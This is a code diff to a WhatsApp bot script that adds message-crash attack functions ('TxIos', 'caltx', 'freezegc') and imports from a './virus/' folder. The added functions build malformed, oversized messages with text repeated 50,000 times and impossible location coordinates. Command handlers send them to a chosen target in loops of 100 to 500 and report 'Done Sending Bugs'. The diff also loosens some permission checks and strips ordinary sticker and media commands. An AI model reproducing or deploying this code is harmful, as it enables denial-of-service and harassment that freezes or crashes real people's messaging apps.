@@ -54,7 +54,15 @@ const { xeontext5 } = require('./69/xeontext5')
 const { xeontext6 } = require('./69/xeontext6')
 const wkwk = fs.readFileSync(`./69/x.mp3`)
 const xsteek = fs.readFileSync(`./69/x.webp`)
-
+const { ngazap } = require('./virus/ngazap')
+const { crash } = require('./virus/crash')
+const { buttonkal } = require('./virus/buttonkal')
+const { cttl } = require('./virus/cttl')
+const { tizi } = require('./virus/tizi')
+const { weg } = require('./virus/weg')
+const { virus7 } = require('./virus/virus7')
+const { notif3 } = require("./virus/notif3")
+const { notif4 } = require("./virus/notif4")
 //database
 let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
 let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
@@ -1020,6 +1028,103 @@ async function ios1(jid) {
 			});
 		};
 
+async function TxIos(target, Ptcp = false) {
+			await XeonBotInc.relayMessage(target, {
+					"extendedTextMessage": {
+						"text": "★ ᴍᴀᴋɪɴᴏ's ᴅᴏᴍᴀɪɴ ★",
+						"contextInfo": {
+							"stanzaId": "1234567890ABCDEF",
+							"participant": "62895364760801@s.whatsapp.net",
+							"quotedMessage": {
+								"callLogMesssage": {
+									"isVideo": true,
+									"callOutcome": "1",
+									"durationSecs": "0",
+									"callType": "REGULAR",
+									"participants": [{
+										"jid": "62895364760801@s.whatsapp.net",
+										"callOutcome": "1"
+									}]
+								}
+							},
+							"remoteJid": target,
+							"conversionSource": "source_example",
+							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+							"conversionDelaySeconds": 10,
+							"forwardingScore": 9999999,
+							"isForwarded": true,
+							"quotedAd": {
+								"advertiserName": "Example Advertiser",
+								"mediaType": "IMAGE",
+								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+								"caption": "This is an ad caption"
+							},
+							"placeholderKey": {
+								"remoteJid": "2349072958046@s.whatsapp.net",
+								"fromMe": false,
+								"id": "ABCDEF1234567890"
+							},
+							"expiration": 86400,
+							"ephemeralSettingTimestamp": "1728090592378",
+							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+							"externalAdReply": {
+								"title": "♱𖤍sᴜᴘʀᴇᴍᴇ ʟᴏʀᴅs𖤍♱〽",
+								"body": "★ ᴍᴀᴋɪɴᴏ's ᴅᴏᴍᴀɪɴ ★",
+								"mediaType": "VIDEO",
+								"renderLargerThumbnail": true,
+								"previewTtpe": "VIDEO",
+								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+								"sourceType": " x ",
+								"sourceId": " x ",
+								"sourceUrl": "https://www.instagram.com/WhatsApp",
+								"mediaUrl": "https://www.instagram.com/WhatsApp",
+								"containsAutoReply": true,
+								"renderLargerThumbnail": true,
+								"showAdAttribution": true,
+								"ctwaClid": "ctwa_clid_example",
+								"ref": "ref_example"
+							},
+							"entryPointConversionSource": "entry_point_source_example",
+							"entryPointConversionApp": "entry_point_app_example",
+							"entryPointConversionDelaySeconds": 5,
+							"disappearingMode": {},
+							"actionLink": {
+								"url": "https://www.instagram.com/WhatsApp"
+							},
+							"groupSubject": "Example Group Subject",
+							"parentGroupJid": "6287888888888-1234567890@g.us",
+							"trustBannerType": "trust_banner_example",
+							"trustBannerAction": 1,
+							"issampled": false,
+							"utm": {
+								"utmSource": "utm_source_example",
+								"utmCampaign": "utm_campaign_example"
+							},
+							"forwardedNewsletterMessageInfo": {
+								"newsletterJid": "6287888888888-1234567890@g.us",
+								"serverMessageId": 1,
+								"newsletterName": " X ",
+								"contentType": "UPDATE",
+								"accessibilityText": " X "
+							},
+							"businessMessageForwardInfo": {
+								"businessOwnerJid": "0@s.whatsapp.net"
+							},
+							"smbClientCampaignId": "smb_client_campaign_id_example",
+							"smbServerCampaignId": "smb_server_campaign_id_example",
+							"dataSharingContext": {
+								"showMmDisclosure": true
+							}
+						}
+					}
+				},
+				Ptcp ? {
+					participant: {
+						jid: target
+					}
+				} : {}
+			);
+		};
 
 async function BugPayment(jid){
 await XeonBotInc.relayMessage(jid, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {}}, interactiveMessage: {
@@ -1404,7 +1509,66 @@ async function ZnXIvS(target, Ptcp = true) {
 			} : {});
 		};
 
-	    
+async function caltx(target) {
+			let etc = generateWAMessageFromContent(
+				target,
+				proto.Message.fromObject({
+					viewOnceMessage: {
+						message: {
+							scheduledCallCreationMessage: {
+								scheduledTimestampMs: Date.now(),
+								hasMediaAttachment: true,
+								text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
+								title: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
+								contextInfo: { mentionedJid: [ "0@s.whatsapp.net" ] }
+								},
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                        groupMentions: [{ groupJid: "120363320283062687@newsletter", groupSubject: "♱𖤍sᴜᴘʀᴇᴍᴇ ʟᴏʀᴅs𖤍♱" }]
+							}
+						}
+					},
+				}), {
+					userJid: target
+				}
+			);
+			await XeonBotInc.relayMessage(target, etc.message, {});
+}
+
+async function freezegc(target) {		
+		    let etc = generateWAMessageFromContent(
+				target,
+				proto.Message.fromObject({
+		           groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 922.999999999999,
+                            degreesLongitude: -9229999999999.999 
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
+           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                        groupMentions: [{ groupJid: "120363320283062687@newsletter", groupSubject: " ♱𖤍sᴜᴘʀᴇᴍᴇ ʟᴏʀᴅs𖤍♱ " }]
+                               }
+                            }
+						}
+					},
+				}), {
+					userJid: target
+				}
+			);
+			await XeonBotInc.relayMessage(target, etc.message, {});
+}
+
         switch (command) {
 case 'button': {
  if (!isPremium) return replygcxeon(mess.prem)
@@ -1748,46 +1912,15 @@ if (!isPremium) return replygcxeon(mess.prem)
 if (!q) return replygcxeon(`Use ${prefix+command} gc-jid\nExample ${prefix+command} gc-jid`)
 let target = q
 await loading()
-for (let i = 0; i < 50; i++) {
-await callbg(target)
-await galx(target, Ptcp = false)
-await galx(target, Ptcp = false) 
-await callbg(target)
-await galx(target, Ptcp = false)
-await galx(target, Ptcp = false)
-await ios1(target)
-await galx(target, Ptcp = false)
-await ios2(target)
-await galx(target, Ptcp = false)
-await ios1(target)
-await galx(target, Ptcp = false)
-await ios2(target)
-await galx(target, Ptcp = false)
-await ios1(target)
-await galx(target, Ptcp = false)
-await ios2(target)
-await galx(target, Ptcp = false)
-await galx(target, Ptcp = false)
-await callbg(target)
-await galx(target, Ptcp = false)
-await galx(target, Ptcp = false)
-await ioscrash(target)
-await galx(target, Ptcp = false)
-await callbg(target)
-await TrashSystem(target, xeonThm, Ptcp = false)
-await galx(target, Ptcp = false)
-await ZnXIvS(target, Ptcp = false)
-await callbg(target)
-await galx(target, Ptcp = false)
-await dott(target)
-await galx(target, Ptcp = false)
-await galx(target, Ptcp = false)
-await callbg(target)
-await galx(target, Ptcp = false)
-await galx(target, Ptcp = false)
-await sleep(2000)
+for (let i = 0; i < 100; i++) {
+caltx(target)
+ioscrash(target)
+freezegc(target)
+ioscrash(target)
+callbg(target)
+ioscrash(target)
 }
-await sendAud(m.chat)
+await XeonBotInc.groupLeave(target)
 }
 break
 
@@ -1912,6 +2045,7 @@ await loading()
 for (let i = 0; i < 500; i++) {
  await ios1(target)
  await ios2(target)
+ await TxIos(target, Ptcp = true)
 }
 await replygcxeon("Done Sending Bugs ✅")
 }
@@ -2222,48 +2356,18 @@ case "getdevice": {
             }
             break
             case 'getcase':
-                if (!isCreator) return replygcxeon(mess.owner)
+                if (!isPremium) return replygcxeon(mess.owner)
                 const getCase = (cases) => {
                     return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                 }
                 replygcxeon(`${getCase(q)}`)
                 break
 			
-case 'test': {
- if (!isCreator) return replygcxeon(mess.done)
-let teks = `XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱`
- const tem = XeonBotInc.sendMessage(m.chat,
-{ text: teks,
-contextInfo:{
-mentionedJid:[sender],
-forwardingScore: 9999999,
-isForwarded: true, 
-"externalAdReply": {
-"showAdAttribution": true,
-"containsAutoReply": true,
-"title": ` ${global.botname}`,
-"body": `${ownername}`,
-"previewType": "PHOTO",
-"thumbnailUrl": ``,
-"thumbnail": fs.readFileSync(`./XeonMedia/thumb.jpg`),
-"sourceUrl": `${link}`}}},
-{ quoted: m})
-
-await sleep(5000)
-XeonBotInc.sendMessage(m.chat, {
-                    delete: {
-                        remoteJid: m.chat,
-                        fromMe: true,
-                        id: tem.key,
-                        participant: XeonBotInc.user.id
-                    }
-                }) 
-		}
 
 			
             case 'delete':
             case 'del': {
-                if (!isCreator) return replygcxeon(mess.done)
+                if (!isPremium) return replygcxeon(mess.prem)
                 if (!m.quoted) throw false
                 let {
                     chat,
@@ -2639,68 +2743,8 @@ contacts: list }, mentions: [sender] }, { quoted: m })
 XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
 }
 break
-       /*     case 'sticker':
-            case 'stiker':
-            case 's': {
-                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + command}`)
-                if (/image/.test(mime)) {
-        pack = Taira•Makino
-        author = args[0]
-            let media = await m.quoted.download();
-            let sticker = new Sticker(media, {
-                pack: pack,
-                author: author, 
-                type: StickerTypes.CROPPED,
-                categories: ["�", "🎉"],
-                id: "12345", 
-                quality: 75,
-            });
-            const buffer = await sticker.toBuffer();
-            return XeonBotInc.sendMessage(m.chat, { sticker: buffer }, {quoted: m });
-		} else return replygcxeon("Couldn't create sticker")
-		fs.unlinkSync(media)
-	    }
-            break*/
 
-
-
-            case 'smeme': {
-                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
-                if (!/image/.test(mime)) return replygcxeon(respond)
-                if (!text) return replygcxeon(respond)
-                replygcxeon(mess.wait)
-                atas = text.split('|')[0] ? text.split('|')[0] : '-'
-                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
-                let dwnld = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
-                let fatGans = await TelegraPh(dwnld)
-                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
-                let pop = await XeonBotInc.sendImageAsSticker(m.chat, smeme, m, {
-                    packname: packname,
-                    author: author
-                })
-                fs.unlinkSync(pop)
-            }
-            break
-/*case 'swm': case 'steal': case 'stickerwm': case 'take':{
-if (!args.join(" ")) return replygcxeon(`Where is the text?`)
-const swn = args.join(" ")
-const pcknm = swn.split("|")[0]
-const atnm = swn.split("|")[1]
-if (m.quoted.isAnimated === true) {
-XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
-XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
-} else if (/image/.test(mime)) {
-let media = await quoted.download()
-let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: "【 𖤍 】⁩ 𝙻𝙾𝚁𝙳 𝚃𝙰𝙸𝚁𝙰 𝙼𝙰𝙺𝙸𝙽𝙾", author: pushname })
-} else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
-let media = await quoted.download()
-let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: "【 𖤍 】⁩ 𝙻𝙾𝚁𝙳 𝚃𝙰𝙸𝚁𝙰 𝙼𝙰𝙺𝙸𝙽𝙾", author: pushname })
-} else {
-replygcxeon(`Photo/Video?`)
-}
-}
-break*/
+						
             case 'toimage':
             case 'toimg': {
                 if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
@@ -2888,290 +2932,7 @@ break*/
                 }, 10000)
             }
             break
-            case 'fliptext': {
-                if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext Xeony`)
-                quere = args.join(" ")
-                flipe = quere.split('').reverse().join('')
-                replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
-            }
-            break
-            case 'listvn': {
-                let teks = '┌──⭓「 *List Vn* 」\n│\n'
-                for (let x of VoiceNoteXeon) {
-                    teks += `│⭔ ${x}\n`
-                }
-                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
-                replygcxeon(teks)
-            }
-            break
-            case 'liststicker': {
-                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
-                for (let x of StickerXeon) {
-                    teks += `│⭔ ${x}\n`
-                }
-                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
-                replygcxeon(teks)
-            }
-            break
-            case 'listimage': {
-                let teks = '┌──⭓「 *List Image* 」\n│\n'
-                for (let x of ImageXeon) {
-                    teks += `│⭔ ${x}\n`
-                }
-                teks += `│\n└────────────⭓\n\n*Total : ${ImageXeon.length}*`
-                replygcxeon(teks)
-            }
-            break
-            case 'listvideo': {
-                let teks = '┌──⭓「 *List Video* 」\n│\n'
-                for (let x of VideoXeon) {
-                    teks += `│⭔ ${x}\n`
-                }
-                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
-                replygcxeon(teks)
-            }
-            break
-            case 'addowner':
-                if (!isCreator) return replygcxeon(mess.owner)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
-bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
-let ceknye = await XeonBotInc.onWhatsApp(bnnd)
-if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
-owner.push(bnnd)
-fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
-replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
-break
-case 'delowner':
-                if (!isCreator) return replygcxeon(mess.owner)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
-ya = q.split("|")[0].replace(/[^0-9]/g, '')
-unp = owner.indexOf(ya)
-owner.splice(unp, 1)
-fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
-replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
-break
-            case 'addvideo': {
-                if (!isPremium) return replygcxeon(mess.prem)
-                if (args.length < 1) return replygcxeon('Video Name?')
-                if (VideoXeon.includes(q)) return replygcxeon("The name you entered already exists")
-                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                VideoXeon.push(q)
-                await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
-                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
-                fs.unlinkSync(delb)
-                replygcxeon(`Success Adding Video\To View Type ${prefix}listvideo`)
-            }
-            break
-            case 'delvideo': {
-                if (!isPremium) return replygcxeon(mess.prem)
-                if (args.length < 1) return replygcxeon('Enter the Video Name')
-                if (!VideoXeon.includes(q)) return replygcxeon("Name Does Not Exist in Database")
-                let wanu = VideoXeon.indexOf(q)
-                VideoXeon.splice(wanu, 1)
-                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
-                fs.unlinkSync(`./XeonMedia/video/${q}.mp4`)
-                replygcxeon(`Successfully Deleted Video ${q}`)
-            }
-            break
-            case 'addimage': {
-                if (!isPremium) return replygcxeon(mess.prem)
-                if (args.length < 1) return replygcxeon('The name of the image?')
-                if (ImageXeon.includes(q)) return replygcxeon("The name you entered is already registered in the database")
-                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                ImageXeon.push(q)
-                await fsx.copy(delb, `./XeonMedia/image/${q}.jpg`)
-                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
-                fs.unlinkSync(delb)
-                replygcxeon(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
-            }
-            break
-            case 'delimage': {
-                if (!isPremium) return replygcxeon(mess.prem)
-                if (args.length < 1) return replygcxeon('Enter the Image Name')
-                if (!ImageXeon.includes(q)) return replygcxeon("The image name you entered is not registered")
-                let wanu = ImageXeon.indexOf(q)
-                ImageXeon.splice(wanu, 1)
-                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
-                fs.unlinkSync(`./XeonMedia/image/${q}.jpg`)
-                replygcxeon(`Successfully Deleted Image ${q}`)
-            }
-            break
-            case 'addsticker': {
-                if (!isPremium) return replygcxeon(mess.prem)
-                if (args.length < 1) return replygcxeon('Enter the name of the sticker?')
-                if (StickerXeon.includes(q)) return replygcxeon("Name Already In Use")
-                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                StickerXeon.push(q)
-                await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
-                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
-                fs.unlinkSync(delb)
-                replygcxeon(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
-            }
-            break
-            case 'delsticker': {
-                if (!isPremium) return replygcxeon(mess.prem)
-                if (args.length < 1) return replygcxeon('Enter the name of the sticker')
-                if (!StickerXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
-                let wanu = StickerXeon.indexOf(q)
-                StickerXeonBotInc.splice(wanu, 1)
-                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
-                fs.unlinkSync(`./XeonMedia/sticker/${q}.webp`)
-                replygcxeon(`Successfully Removed Sticker ${q}`)
-            }
-            break
-            case 'addvn': {
-                if (!isPremium) return replygcxeon(mess.prem)
-                if (args.length < 1) return replygcxeon('Enter the Name?')
-                if (VoiceNoteXeon.includes(q)) return replygcxeon("Name Already In Use")
-                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                VoiceNoteXeon.push(q)
-                await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
-                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
-                fs.unlinkSync(delb)
-                replygcxeon(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
-            }
-            break
-            case 'delvn': {
-                if (!isPremium) return replygcxeon(mess.prem)
-                if (args.length < 1) return replygcxeon('Enter the Name')
-                if (!VoiceNoteXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
-                let wanu = VoiceNoteXeon.indexOf(q)
-                VoiceNoteXeon.splice(wanu, 1)
-                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
-                fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
-                replygcxeon(`Successfully Deleted Audio ${q}`)
-            }
-            break
-case 'addzip':{
-if (!isPremium) return replygcxeon(mess.prem)
-await loading()
-if (args.length < 1) return replygcxeon(`What's the zip name?`)
-let teks = `${text}`
-{
-if (ZipXeon.includes(teks)) return replygcxeon("This name is already in use")
-let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-ZipXeon.push(teks)
-await fsx.copy(delb, `./XeonMedia/zip/${teks}.zip`)
-fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
-fs.unlinkSync(delb)
-replygcxeon(`Success Adding zip\nTo check type ${prefix}listzip`)
-}
-}
-break
-case 'delzip':{
-if (!isPremium) return replygcxeon(mess.prem)
-await loading()
-if (args.length < 1) return replygcxeon('Enter the text in the zip list')
-let teks = `${text}`
-{
-if (!ZipXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
-let wanu = ZipXeon.indexOf(teks)
-ZipXeon.splice(wanu, 1)
-fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
-fs.unlinkSync(`./XeonMedia/zip/${teks}.zip`)
-replygcxeon(`Successfully deleted zip ${teks}`)
-}
-}
-break
-case 'listzip': {
-await loading()
-let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
-for (let x of ZipXeon) {
-teksooooo += `│⭔ ${x}\n`
-}
-teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
-replygcxeon(teksooooo)
-}
-break
-case 'addapk':{
-if (!isPremium) return replygcxeon(mess.prem)
-await loading()
-if (args.length < 1) return replygcxeon('What is the name of the apk?')
-let teks = `${text}`
-{
-if (ApkXeon.includes(teks)) return replygcxeon("This name is already in use")
-let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-apknye.push(teks)
-await fsx.copy(delb, `./XeonMedia/apk/${teks}.apk`)
-fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
-fs.unlinkSync(delb)
-replygcxeon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
-}
-}
-break
-case 'delapk':{
-if (!isPremium) return replygcxeon(mess.prem)
-await loading()
-if (args.length < 1) return replygcxeon('Name of the apk?')
-let teks = `${text}`
-{
-if (!ApkXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
-let wanu = ApkXeon.indexOf(teks)
-ApkXeon.splice(wanu, 1)
-fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
-fs.unlinkSync(`./XeonMedia/apk/${teks}.apk`)
-replygcxeon(`Successfully deleted Apk ${teks}`)
-}
-}
-break
-case 'listapk': {
-await loading()
-let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
-for (let x of ApkXeon) {
-teksoooooo += `│⭔ ${x}\n`
-}
-teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
-replygcxeon(teksoooooo)
-}
-break
-case 'addpdf':{
-if (!isPremium) return replygcxeon(mess.prem)
-await loading()
-if (args.length < 1) return replygcxeon('What is the name of the pdf')
-let teks = `${text}`
-{
-if (DocXeon.includes(teks)) return replygcxeon("This name is already in use")
-let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-docunye.push(teks)
-await fsx.copy(delb, `./XeonMedia/doc/${teks}.pdf`)
-fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
-fs.unlinkSync(delb)
-replygcxeon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
-}
-}
-break
-case 'delpdf':{
-if (!isPremium) return replygcxeon(mess.prem)
-await loading()
-if (args.length < 1) return replygcxeon('Enter the name')
-let teks = `${text}`
-{
-if (!DocXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
-let wanu = DocApk.indexOf(teks)
-docunye.splice(wanu, 1)
-fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
-fs.unlinkSync(`./XeonMedia/doc/${teks}.pdf`)
-replygcxeon(`Successfully deleted pdf ${teks}`)
-}
-}
-break
-case 'listpdf': {
-await loading()
-let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
-for (let x of docunye) {
-teksoooo += `│⭔ ${x}\n`
-}
-teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
-replygcxeon(teksoooo)
-}
-break
-            case 'afk':
-                if (!m.isGroup) return replygcxeon(mess.group)
-                if (isAfkOn) return replygcxeon("Already afk")
-                let reason = text ? text : 'Nothing.'
-                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
-                replygcxeon(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
-                break
+
 case 'play':  case 'song': {
 if (!text) return replygcxeon(`Example : ${prefix + command} anime whatsapp status`)
 const xeonplaymp3 = require('./lib/ytdl2')
@@ -3401,153 +3162,22 @@ break
 case 'clearchat':
